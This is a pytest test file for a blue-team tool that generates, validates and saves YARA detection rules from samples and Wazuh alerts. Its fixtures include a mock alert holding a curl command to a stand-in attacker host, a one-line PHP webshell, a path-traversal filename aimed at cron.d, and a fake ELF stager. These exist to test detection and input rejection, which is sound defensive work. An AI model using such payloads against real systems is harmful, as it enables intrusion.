#!/usr/bin/env python3
"""
© NAuliajati - TangerangKota-CSIRT
Tests for mcp_server.tools.yara_rules.
yara-x is a hard dependency of the engine, but these tests skip cleanly when it
is absent so CI without the wheel does not go red. The tools are plain async
functions (FastMCP returns the wrapped function), so they are awaited directly.
"""
from __future__ import annotations
import asyncio
import json
import os
import pytest

# Env must be set before mcp_server is imported.
os.environ.setdefault("WAZUH_INDEXER_URL", "https://indexer:9200")
os.environ.setdefault("WAZUH_INDEXER_PASSWORD", "test-indexer-pass")
os.environ.setdefault("WAZUH_API_URL", "https://manager:55000")
os.environ.setdefault("WAZUH_API_PASSWORD", "test-manager-pass")
os.environ.setdefault("BLUETEAM_REDACTION_POLICY", "full")

_ELF_SAMPLE = b"\x7fELF\x02\x01\x01\x00" + b"\x00" * 40 + \
    b"Usage: evilstager --target [IP] --port [PORT]" + b"\x00" * 8

_VALID_RULE = """rule MAL_Test_Win_Loader_Jan25 {
   meta:
      description = "Detects a test loader"
      author = "Test"
      date = "2025-01-01"
      reference = "Internal Research"
   strings:
      $x1 = "evilpayloadstring"
   condition:
      $x1
}
"""


def _module():
    from mcp_server.tools import yara_rules

    return yara_rules


def _run(coro):
    return asyncio.run(coro)


@pytest.fixture(autouse=True)
def _require_yara_x():
    pytest.importorskip("yara_x")


# Pure helpers

def test_extract_drops_generics_keeps_preselectors():
    yr = _module()
    data = (b"<?php echo 1; ?>\nCopyright\nMicrosoft\nhttp://a.b/c\n"
            b"evilstager_cmd_7788")
    atoms, prese = yr._extract_from_bytes(data)
    flat = b" ".join(atoms)
    assert b"Copyright" not in flat and b"Microsoft" not in flat
    assert b"evilstager_cmd_7788" in flat
    assert b"<?php" in prese


def test_extract_is_deterministic():
    yr = _module()
    data = b"alpha_string_1234 beta_string_5678 gamma_string_9012"
    assert yr._extract_from_bytes(data) == yr._extract_from_bytes(data)


def test_atom_score_rejects_short():
    yr = _module()
    assert yr._atom_score(b"abc") == 0.0
    assert yr._atom_score(b"abcd") > 0.0


def test_detect_magic_elf_pe_and_php():
    yr = _module()
    assert yr._detect_magic(_ELF_SAMPLE)[:2] == ("LNX", "SUSP")
    assert yr._detect_magic(b"MZ\x90\x00" + b"\x00" * 20)[:2] == ("WIN", "SUSP")
    assert yr._detect_magic(b"<?php system($_GET['c']); ?>")[1] == "WEBSHELL"


def test_digest_is_stable_and_order_insensitive():
    yr = _module()
    a = yr._digest([b"one_string_here", b"two_string_here"])
    b = yr._digest([b"two_string_here", b"one_string_here"])
    assert a == b == yr._digest([b"one_string_here", b"two_string_here"])


def test_render_single_atom_compiles_with_explicit_and():
    """Regression: condition lines must be joined with 'and', not juxtaposed."""
    yr = _module()
    src = yr._render_rule("SUSP_LNX_Wazuh_Test_abc123", "d", "r", 60,
                          [b"Usage: evilstager --target"], [], "uint32(0) == 0x464c457f",
                          1, "abc123")
    rules, errors, _ = yr._compile(src)
    assert rules is not None, errors
    hits = yr._scan(rules, _ELF_SAMPLE)
    assert hits and len(hits[0]["patterns"]) == 1


def test_scan_does_not_match_unrelated_data():
    yr = _module()
    rules, _, _ = yr._compile(_VALID_RULE)
    assert yr._scan(rules, b"\x00" * 200) == []


def test_static_checks_flag_naming_meta_atom_and_fullword():
    yr = _module()
    bad = ('rule bad_name {\n strings:\n  $s1 = "abc"\n  $s2 = "a\\\\b.cd" fullword\n'
           ' condition:\n  $s1 or $s2\n}')
    findings = " | ".join(yr._static_checks(bad))
    assert "SV1" in findings
    assert "PA2" in findings
    assert "missing mandatory field" in findings
    assert "SM5" in findings


# blueteam_yara_rule_validate
def test_validate_tool_passes_valid_rule():
    yr = _module()
    out = _run(yr.blueteam_yara_rule_validate(
        yr.YaraRuleValidateInput(rule_source=_VALID_RULE, response_format="json")))
    payload = json.loads(out)
    assert payload["valid"] is True
    assert payload["rule_name"] == "MAL_Test_Win_Loader_Jan25"


def test_validate_tool_reports_compile_error():
    yr = _module()
    out = _run(yr.blueteam_yara_rule_validate(
        yr.YaraRuleValidateInput(rule_source="rule x { condition: ", response_format="json")))
    payload = json.loads(out)
    assert payload["valid"] is False and payload["errors"]


# blueteam_yara_rule_generate file mode
def test_generate_file_mode_verified_and_self_scan(tmp_path, monkeypatch):
    yr = _module()
    monkeypatch.setattr(yr, "ALLOWED_PATH_PREFIXES", [str(tmp_path)])
    sample = tmp_path / "stager.bin"
    sample.write_bytes(_ELF_SAMPLE)

    out = _run(yr.blueteam_yara_rule_generate(yr.YaraRuleGenerateInput(
        mode="file", file_path=str(sample), self_scan=True, response_format="json")))
    payload = json.loads(out)
    assert payload["coverage"] == "verified"
    assert payload["validation"]["valid"] is True
    assert payload["self_scan"], "rule must match its own sample"
    # Local path must never leak into rule metadata.
    assert str(tmp_path) not in payload["rule_source"]


def test_generate_file_mode_with_no_atoms_still_compiles(tmp_path, monkeypatch):
    yr = _module()
    monkeypatch.setattr(yr, "ALLOWED_PATH_PREFIXES", [str(tmp_path)])
    sample = tmp_path / "x.bin"
    sample.write_bytes(b"\x7fELF" + b"\x00" * 20)
    out = _run(yr.blueteam_yara_rule_generate(yr.YaraRuleGenerateInput(
        mode="file", file_path=str(sample), self_scan=True, response_format="json")))
    payload = json.loads(out)
    assert payload["coverage"] in ("verified", "unverified")
    assert payload["validation"]["valid"] is True


def test_read_sample_rejects_path_outside_allowlist(tmp_path, monkeypatch):
    yr = _module()
    outside = tmp_path / "s.bin"
    outside.write_bytes(_ELF_SAMPLE)
    monkeypatch.setattr(yr, "ALLOWED_PATH_PREFIXES", ["/var", "/etc"])
    with pytest.raises(yr.BlueTeamMCPError):
        yr._read_sample(str(outside))


def test_read_sample_rejects_empty_and_oversized(tmp_path, monkeypatch):
    yr = _module()
    monkeypatch.setattr(yr, "ALLOWED_PATH_PREFIXES", [str(tmp_path)])
    empty = tmp_path / "empty.bin"
    empty.write_bytes(b"")
    with pytest.raises(yr.BlueTeamMCPError):
        yr._read_sample(str(empty))

    big = tmp_path / "big.bin"
    big.write_bytes(_ELF_SAMPLE)
    monkeypatch.setattr(yr, "_MAX_SAMPLE_BYTES", 4)
    with pytest.raises(yr.BlueTeamMCPError):
        yr._read_sample(str(big))


# blueteam_yara_rule_generate text + alert mode
def test_generate_text_mode_is_draft_and_not_redacted():
    """redact=False is a design decision: attacker IOCs must survive into $x/$s."""
    yr = _module()
    out = _run(yr.blueteam_yara_rule_generate(yr.YaraRuleGenerateInput(
        mode="text", text="http://10.0.0.5/payload.php?x=evil.example.com",
        response_format="json")))
    payload = json.loads(out)
    assert payload["coverage"] == "draft"
    assert payload["validation"]["valid"] is True
    assert "evil.example.com" in payload["rule_source"]


def test_generate_alert_mode_builds_from_docs(monkeypatch):
    yr = _module()

    async def fake_docs(srcip, rule_id, since, limit):
        return [{"data": {"url": "http://evil.example.com/asu.php",
                          "command": "curl http://evil.example.com/asu.php"}}]

    monkeypatch.setattr(yr, "_fetch_alert_docs", fake_docs)
    out = _run(yr.blueteam_yara_rule_generate(yr.YaraRuleGenerateInput(
        mode="alert", srcip="10.0.0.5", response_format="json")))
    payload = json.loads(out)
    assert payload["coverage"] == "draft"
    assert payload["alert_field_coverage"]["data.url"] == 1
    assert "evil.example.com" in payload["rule_source"]


def test_fetch_alert_docs_builds_multifield_srcip_query(monkeypatch):
    yr = _module()
    captured = {}

    async def fake_post(body, index_pattern=None):
        captured["body"] = body
        return {"hits": {"hits": [{"_source": {"data": {"url": "http://x.y/z"}}}]}}

    monkeypatch.setattr("mcp_server.wazuh.indexer._wazuh_indexer_post", fake_post)
    docs = _run(yr._fetch_alert_docs("10.0.0.5", "600029", "24h", 10))
    assert docs and captured["body"]["size"] == 10
    must = captured["body"]["query"]["bool"]["must"]
    srcip_clause = [c for c in must if "bool" in c and "should" in c["bool"]]
    assert srcip_clause, "srcip filter missing"
    assert any("data.srcip.keyword" in json.dumps(s) for s in srcip_clause)
    assert "full_log" not in captured["body"]["_source"]


# blueteam_yara_rule_save
def test_save_writes_rule_and_refuses_overwrite(tmp_path, monkeypatch):
    yr = _module()
    monkeypatch.setattr(yr, "_rules_dir", lambda: tmp_path)
    out = _run(yr.blueteam_yara_rule_save(yr.YaraRuleSaveInput(
        rule_source=_VALID_RULE, response_format="json")))
    payload = json.loads(out)
    saved = tmp_path / "MAL_Test_Win_Loader_Jan25.yar"
    assert payload["saved"] is True and saved.exists()
    # str_strip_whitespace on the input model trims the trailing newline.
    assert saved.read_text() == _VALID_RULE.strip()

    # A second save without overwrite is refused, and @blueteam_tool renders the
    # typed exception as an error payload rather than re-raising it.
    dup = json.loads(_run(yr.blueteam_yara_rule_save(
        yr.YaraRuleSaveInput(rule_source=_VALID_RULE, response_format="json"))))
    assert "error" in dup and dup["type"] == "BlueTeamMCPError"

    out2 = _run(yr.blueteam_yara_rule_save(yr.YaraRuleSaveInput(
        rule_source=_VALID_RULE, overwrite=True, response_format="json")))
    assert json.loads(out2)["saved"] is True


def test_save_rejects_traversal_filename(tmp_path, monkeypatch):
    yr = _module()
    monkeypatch.setattr(yr, "_rules_dir", lambda: tmp_path)
    out = json.loads(_run(yr.blueteam_yara_rule_save(yr.YaraRuleSaveInput(
        rule_source=_VALID_RULE, filename="../../etc/cron.d/x.yar",
        response_format="json"))))
    assert "error" in out


def test_save_rejects_invalid_rule(tmp_path, monkeypatch):
    yr = _module()
    monkeypatch.setattr(yr, "_rules_dir", lambda: tmp_path)
    out = json.loads(_run(yr.blueteam_yara_rule_save(yr.YaraRuleSaveInput(
        rule_source="rule broken { condition: ", response_format="json"))))
    assert "error" in out
    assert list(tmp_path.iterdir()) == []
